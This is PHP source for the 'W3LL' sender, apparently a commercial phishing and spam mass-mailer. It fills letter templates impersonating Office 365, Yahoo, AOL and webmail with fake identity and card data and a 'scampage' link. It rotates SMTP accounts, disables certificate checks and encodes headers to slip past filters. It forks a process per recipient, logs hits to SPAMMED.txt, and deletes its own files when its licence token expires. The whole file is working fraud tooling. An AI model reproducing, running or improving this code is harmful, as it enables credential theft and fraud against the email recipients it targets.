        '++w3ll_data_email_u++',
        '++w3ll_data_email_d++',
        '++w3ll_data_username++',
        '++w3ll_data_password++',
        '++w3ll_data_domain++',
        '++w3ll_data_useragent++',
        '++w3ll_data_ipv4++',
        '++w3ll_data_macaddress++',
        '++w3ll_data_plasticcard++',
        '++w3ll_data_cardexpir++',
        '++w3ll_data_bonus++',
        '++w3ll_data_company++',
        '++w3ll_data_color++',
        '++w3ll_data_uuid++',
        '++w3ll_data_height++',
        '++w3ll_data_weight++',
        '++w3ll_data_blood++',
        '++w3ll_data_eye++',
        '++w3ll_data_hair++',
        '++w3ll_data_sport++',
        '++w3ll_domain_url++',
        '++w3ll_smtp++',
        '++w3ll_short64++',
        '++w3ll_email64++',
        '++w3ll_email++',
        '++w3ll_subject++',
        '++w3ll_randomip++',
        '++w3ll_frommail++',
        '++w3ll_fromname++',
        '++w3ll_short++',
        '++w3ll_randstring++',
        '++w3ll_country++',
        '++w3ll_date++',
        '++w3ll_number1++',
        '++w3ll_number2++',
        '++w3ll_number3++',
        '++w3ll_number4++',
        '++w3ll_number5++',
        '++w3ll_number6++',
        '++w3ll_number7++',
        '++w3ll_number8++',
        '++w3ll_number9++',
        '++w3ll_number10++',
        '++w3ll_os++',
        '++w3ll_browser++',
        '++w3ll_time++',
        '++w3ll_user++',
        '++w3ll_domain++',
        '++w3ll_domain1++',
        '++w3ll_secret_email++',
        '++w3ll_smtp_user++'
    );

    $new  = array(''.$img_src.'', ''.$w3ll_data_name.'',''.$w3ll_data_address.'',''.$w3ll_data_latitude.'',''.$w3ll_data_longitude.'',''.$w3ll_data_maiden_name.'',''.$w3ll_data_birth_data.'',''.$w3ll_data_phone_h.'',''.$w3ll_data_phone_w.'',''.$w3ll_data_email_u.'',''.$w3ll_data_email_d.'',''.$w3ll_data_username.'',''.$w3ll_data_password.'',''.$w3ll_data_domain.'',''.$w3ll_data_useragent.'',''.$w3ll_data_ipv4.'',''.$w3ll_data_macaddress.'',''.$w3ll_data_plasticcard.'',''.$w3ll_data_cardexpir.'',''.$w3ll_data_bonus.'', ''.$w3ll_data_company.'', ''.$w3ll_data_color.'', ''.$w3ll_data_uuid.'', ''.$w3ll_data_height.'', ''.$w3ll_data_weight.'', ''.$w3ll_data_blood.'', ''.$w3ll_data_eye.'', ''.$w3ll_data_hair.'', ''.$w3ll_data_sport.'', ''.$host.'',''.$smtp_email.'',''.$base64url.'',''.$email64.'',''.$email.'', ''.$subject.'', ''.$randip.'', ''.$frommail.'', ''.$fromname.'', ''.$randurls.'', ''.$randstr1.'', ''.$country.'', ''.$date.'', ''.$randnumber1.'', ''.$randnumber2.'', ''.$randnumber3.'', ''.$randnumber4.'', ''.$randnumber5.'', ''.$randnumber6.'', ''.$randnumber7.'', ''.$randnumber8.'', ''.$randnumber9.'', ''.$randnumber10.'', ''.$OS.'', ''.$browser.'',''.$time.'',''.$user.'',''.$domain.'',''.$domain1.'',''.$secret_mail.'', ''.$smtp_user.'');
    $repl = str_replace($arr, $new, $file);
    return $repl;
};

function Reletter($letter, $mailto)
{
    $file = file_get_contents($letter);
    $arr  = array('++w3ll_email++');
    $new  = array(''.$mailto.'');
    $repl = str_replace($arr, $new, $file);
    return $repl;
};

function berhenti($kata)
{
    $k = strlen($kata);
    if ($k == $k) {
        $p = substr($kata, $k - 1);
        if ($p == 0) {
            echo "Break for 5 seconds...\n";
            sleep(5);
        }
    }
}

function Savedata($file, $data)
{
    $file = fopen($file, "w");
    fputs($file, PHP_EOL.$data);
    return fclose($file);
};

function RemoveLine($file, $name)
{
    $getfile  = file_get_contents($file);
    $search   = explode($name, $getfile);
    $save     = $search[1];
    $savedata = Savedata($file, $save);
    return $savedata;
};

system('clear');
date_default_timezone_set('America/Los_Angeles');
require         'setting/phpmailer/PHPMailerAutoload.php';
echo "\e[0;34m          ██╗    ██╗\e[92m██████╗\e[0;36m ██╗\e[0;31m     ██╗     \e[0m\r\n";
echo "\e[0;34m          ██║    ██║\e[92m╚════██╗\e[0;36m██║\e[0;31m     ██║     \e[0m\r\n";
echo "\e[0;34m          ██║ █╗ ██║\e[92m █████╔╝\e[0;36m██║\e[0;31m     ██║     \e[0m\r\n";
echo "\e[0;34m          ██║███╗██║\e[92m ╚═══██╗\e[0;36m██║\e[0;31m     ██║     \e[0m\r\n";
echo "\e[0;34m          ╚███╔███╔╝\e[92m██████╔╝\e[0;36m███████╗\e[0;31m███████╗\e[0m\r\n";
echo "\e[0;34m           ╚══╝╚══╝\e[92m ╚═════╝\e[0;36m ╚══════╝\e[0;31m╚══════╝\e[0m\r\n";
echo "                       \e[32;1m                             V1.4.7\e[0m\r\n";
echo "                                  \r\n";
echo "\r\n";

if (preg_match('/\bDays Left\b/',$checkval)) {
        echo "                             \e[32;1mUsername : $checkval\n\n\e[0m";
} else if($checkval == 'Please renew your Token') {
    unlink('README.txt');
    unlink('W3LL.php');
    unlink('setting/phpmailer/class.phpmailer.php');
    unlink('setting/phpmailer/class.smtp.php');
    unlink('setting/phpmailer/PHPMailerAutoload.php');
    unlink('file/W3LL_MAILIST/W3LL_LIST.txt');
    unlink('file/W3LL_LETTER/AOL.html');
    unlink('file/W3LL_LETTER/CHINESE.html');
    unlink('file/W3LL_LETTER/MAIL.RU.html');
    unlink('file/W3LL_LETTER/OFFICE.html');
    unlink('file/W3LL_LETTER/WEBMAIL.html');
    unlink('file/W3LL_LETTER/YAHOO.html');
    rmdir('setting/phpmailer');
    rmdir('setting');
    rmdir('file/W3LL_MAILIST');
    rmdir('file/W3LL_LETTER');
    rmdir('file');
    system('clear');
    echo "                          \e[1;37;41mError : Token Expired\n\e[0m";
    die();
} else {
    echo "                      \e[1;37;41mError : $checkval\n\e[0m";
    die();
}

function encode($text)
{
   $list = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",":","/") ;
   $replace = array("a", "b", "c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",":","/");
   $walah = str_replace($list, $replace, $text);
   return $walah;
}

function SmtpType($smtp)
{
    if (preg_match('/\bsendgrid\b/',$smtp)) {
        $type = 'SENDGRID';
    } else if (preg_match('/\bgmail\b/',$smtp)) {
        $type = 'G-SUITE';
    } else if (preg_match('/\bsecuresmtp\b/',$smtp)) {
        $type = 'T-ONLINE';
    } else if (preg_match('/\boffice365\b/',$smtp)) {
        $type = 'OFFICE 365';
    } else if (preg_match('/\bemailsrvr\b/',$smtp)) {
        $type = 'RACKSPACE';
    } else {
        $type = 'CRACKED';
    }
    return $type;
}

function Kirim($email, $smtp_acc, $W3LL_setup)
{
    global $ahh, $num;

    $smtp              = new SMTP;
    $smtp->do_debug    = 0;
    $smtp->SMTPOptions = array (
                            'ssl' => array(
                            'verify_peer'  => false,
                            'verify_peer_name'  => false,
                            'allow_self_signed' => true));
    $smtpserver        = $smtp_acc['host'];
    $smtpport          = $smtp_acc['port'];
    $smtpuser          = $smtp_acc['username'];
    $smtppass          = $smtp_acc['password'];
    $priority          = $W3LL_setup['priority'];
    $sleeptime         = $W3LL_setup['sleeptime'];
    $replacement       = $W3LL_setup['replacement'];
    $userremoveline    = $W3LL_setup['userremoveline'];
    $fromname          = $W3LL_setup['fromname'];
    $frommail          = $W3LL_setup['frommail'];
    $subject           = $W3LL_setup['subject'];
    $msgfile           = $W3LL_setup['msgfile'];
    $filepdf           = $W3LL_setup['filesend'];
    $randurl           = $W3LL_setup['scampage'];
    $redirect          = $W3LL_setup['redirect'];
    $subject_encrypt   = $W3LL_setup['subject_encrypt'];
    $fromname_encrypt  = $W3LL_setup['fromname_encrypt'];



    if (!$smtp->connect($smtpserver, $smtpport)) {
        //throw new Exception('Connect failed');
        echo "     [\e[0;31mPLEASE CHECK UR SMTP ON http://smtper.net AND MAKE SURE UR SMTP USE PORT 587 [CASE1]\e[0m ]\r\n";
        die();
    }

    if (!$smtp->hello(gethostname())) {
        //throw new Exception('EHLO failed: '.$smtp->getError()['error']);
        echo "     [\e[0;31mPLEASE CHECK UR SMTP ON http://smtper.net AND MAKE SURE UR SMTP USE PORT 587 [CASE2] \e[0m ]\r\n";
        die();
    }

    $e = $smtp->getServerExtList();
    $smtptypez = SmtpType($smtpserver);

    if (array_key_exists('AUTH', $e)) {
        if ($smtp->authenticate($smtpuser, $smtppass)) {
            if (!is_file($msgfile)) {
                echo "     [\e[0;31m LETTER NOT FOUND - PLEASE CHECK YOUR LETTER NAME !\e[0m ]\r\n";
                die();
            }

            if ($W3LL_setup['filesend'] == 1) {
                if(!is_file($W3LL_setup['attach'])) {
                    echo "     [\e[0;31m ATTACHMENT NOT FOUND - PLEASE CHECK YOUR ATTACHMENT NAME !\e[0m ]\r\n";
                    die();
                }
            }

            $randstr023     = RandString1(16);
            $mail           = new PHPMailer;
            $selector       = 'phpmailer';                  // CREATE DKIM
            $privatekeyfile = 'setting/dkim_private.pem';   // Path to your private key
            $publickeyfile  = 'setting/dkim_public.pem';    // Path to your public key
            $mail->Encoding = 'base64'; // 8bit base64 multipart/alternative quoted-printable
            $mail->CharSet  = 'UTF-8';
            $mail->headerLine("format", "flowed");
            $mail->addCustomHeader("MIME-Version: 1.0\r\n");// Smtp connect
            $mail->IsSMTP();                                // Start SMTP
            $mail->SMTPAuth = true;
            $mail->SMTPAutoTLS = 1;
            $mail->Host     = $smtpserver;
            $mail->Port     = $smtpport;
            $mail->Priority = $priority;
            $mail->Username = $smtpuser;
            $mail->Password = $smtppass;
            $mail->SMTPOptions = array (
                                  'ssl' => array(
                                  'verify_peer'  => false,
                                  'verify_peer_name'  => false,
                                  'allow_self_signed' => true));
            $randstr01      = RandString1(8);
            $randstr011     = RandString(5);
            $randstr012     = RandString1(5);
            $nmbr           = RandNumber(5);

            shuffle($subject);
            $subject   = array_shift($subject);
            shuffle($fromname);
            $fromname  = array_shift($fromname);
            $fromnames = str_replace('++w3ll_smtp++', $smtpuser, $fromname);
            $frommails = str_replace('++w3ll_smtp++', $smtpuser, $frommail);
            $fromnames = str_replace('++w3ll_randstring++', $randstr011, $fromnames);
            $frommails = str_replace('++w3ll_randstring++', $randstr01, $frommails);
            $fromnames = privateLHZ($email, $fromnames, $smtpuser);
            $frommails = privateLHZ1($email, $frommails);
            $subjects  = str_replace('++w3ll_randstring++', $randstr012, $subject);
            $subjects  = subjecting($subjects, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);

            if ($fromname_encrypt == 1) {
                $rand = 0;

                switch ($rand) {
                    case 0:
                        $fromnames = '=?UTF-8?B?'.base64_encode($fromnames).'?=';
                        $mail->setFrom($frommails, $fromnames);
                        break;
                }
            } else {
               $mail->setFrom($frommails, $fromnames);
            }

            $mail->AddAddress($email);

            if ($subject_encrypt == 1) {
                $rand = 0;
                switch ($rand) {
                    case 0:
                        $subjects = '=?UTF-8?B?'.base64_encode($subjects).'?=';
                        $mail->Subject = $subjects;
                        break;
                }
            } else {
                $mail->Subject = $subjects;
            }

            if ($W3LL_setup['filesend'] == 1) {
                $attch = file_get_contents($W3LL_setup['attach']);
                $attach = lettering($W3LL_setup['attach'], $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);
                file_put_contents($W3LL_setup['attach'], $attach);
                $mail->AddAttachment($W3LL_setup['attach']);
            }

            if ($replacement == 1) {
                $msg = lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject, $smtpuser, $redirect);
            } else {
                $msg = file_get_contents($msgfile);
            }

            $mail->msgHTML($msg);

            if (!$mail->send()) {
                $err = 0;
                $halo = $mail->ErrorInfo;

                if (preg_match('/\bquota\b/',$halo)) {
                    $err = 1;
                }

                if ($err == 1) {
                    echo "     [\e[92m".date('h:i:s')."\033[0m] ";
                    echo "[\e[1;35m";
                    echo $num+1 ."\e[0m] ";
                    echo "\e[0m[\e[1;34m$email\e[0m] ";
                    echo " > [\e[0;31mFAIL - $smtptypez SMTP SEND QUOTA HAS LIMIT - NOT REMOVED\e[0m]\n";

                } else {
                    if ($W3LL_setup['userremoveline'] == 1) {
                        echo "     [\e[92m".date('h:i:s')."\033[0m] ";
                        echo "[\e[1;35m";
                        echo $num+1 ."\e[0m] ";
                        echo "\e[0m[\e[1;34m$email\e[0m] ";
                        echo " > [\e[0;31mEMAIL NOT VALID - REMOVED\e[0m]\r\n";

                        Savedata($W3LL_setup['mail_list'], trim(str_replace($email, "", file_get_contents($W3LL_setup['mail_list']))));
                        $file = fopen("INVALID.txt", "a+");
                        fwrite($file, "$email\n");
                        fclose($file);
                    } else {
                        echo "     [\e[92m".date('h:i:s')."\033[0m] ";
                        echo "[\e[1;35m";
                        echo $num+1 ."\e[0m] ";
                        echo "\e[0m[\e[1;34m$email\e[0m] ";
                        echo " > [\e[0;31mFAIL - EMAIL NOT VALID - NOT REMOVED\e[0m]\n";
                    }
                    //exit();
                }
            } else {
                echo "     [\e[92m".date('h:i:s')."\033[0m] ";
                echo "[\e[1;35m";
                echo $num+1 ."\e[0m] ";
                echo "\e[0m[\e[1;34m$email\e[0m] ";
                echo " > [\e[92mSENT\e[0m]\n";
                $file = fopen("SPAMMED.txt", "a");
                fwrite($file,"". $email." \r\n");
                fclose($file);
            }
            $mail->clearAddresses();

        } else {
            echo "     [\e[92m".date('d/m/Y h:i:s')."\033[0m] ";
            echo "[\e[1;35m";
            echo $num+1 ."\e[0m] ";;
            echo "\e[0m[\e[1;34m$email\e[0m] ";
            echo " > [\e[0;31mFAIL - SOMETHING WRONG ON SMTP - NOT REMOVED\e[0m]\n";
            $file = fopen("FAILED.txt", "a");
            fwrite($file,"". $email." \r\n");
            fclose($file);
        }
    }
    $smtp->quit(true);
}


$dipake = 0;

if (!is_file($W3LL_setup['mail_list'])) {
     echo "     [\e[0;31m MAILIST NOT FOUND - PLEASE CHECK YOUR MAILIST NAME !\e[0m ]\r\n";
     die();
}

$file = file_get_contents($W3LL_setup['mail_list']);

if ($file) {
    $ext = explode("\n", $file);
    echo"\e[31m            NOTE: IF YOU DONT BUY THIS SENDER FROM HTTPS://W3LLSTORE.CO, \r\n         MEAN YOU USE ILLEGAL SENDER..AND YOUR TOKEN WILL BE BANNED SOON!\e[0m";
    echo " \r\n\r\n                                   \e[1;94m████████████\e[0m                           \r\n";
    echo "\e[0m     ██████████████████████████████\e[1;32m \e[92mW\e[33m3\e[36mL\e[35mL \e[31mS\e[92mT\e[33mA\e[36mR\e[35mT \e[0m████████████████████████████\e[0m\n";
    echo "                                  \e[1;94m ████████████\e[0m\r\n";
    echo "\r\n";

    $smtp_key = 0;
    $rat      = $W3LL_setup['ratio'];
    $crot     = 0;
    $crotmax  = count($ext) - 1;

    foreach ($ext as $num => $email) {
        if ($smtp_key == count($smtp_acc)) {
            $smtp_key = 0;
        }

        $ahh = $ext[$crot];
        $gx_setup['fromname'] = $ahh;
        $crot++;

        if ($crot >= $crotmax){
            $crot = 0;
        }

        $pid = pcntl_fork();

        if ($pid == -1) {
            exit("Error forking...\n");
        } else if ($pid == 0) {
            Kirim($email, $smtp_acc[$smtp_key], $W3LL_setup);
            exit();
        }

        $dipake++;
        $smtp_key++;
        $rat--;

        if ($rat == 0) {
            sleep($W3LL_setup['sleeptime']);
            $rat = $W3LL_setup['ratio'];
            echo "     \e[31m=======SEND $rat EMAIL WITH DELAY ".$W3LL_setup['sleeptime']." SECOND=======\e[0m\r\n";
        }

        if ($W3LL_setup['userremoveline'] == 1) {
            unset($ext[$num]);
            Savedata($W3LL_setup['mail_list'], implode("\n", $ext));

        }
    }
    echo " \r\n\r\n                                   \e[1;94m███████████\e[0m                           \r\n";
    echo "\e[0m     ██████████████████████████████\e[1;32m \e[92mW\e[33m3\e[36mL\e[35mL \e[31mD\e[92mO\e[33mN\e[36mE \e[0m████████████████████████████\e[0m\n";
    echo "                                  \e[1;94m ███████████\e[0m\r\n";
    echo "\r\n";
}
?>
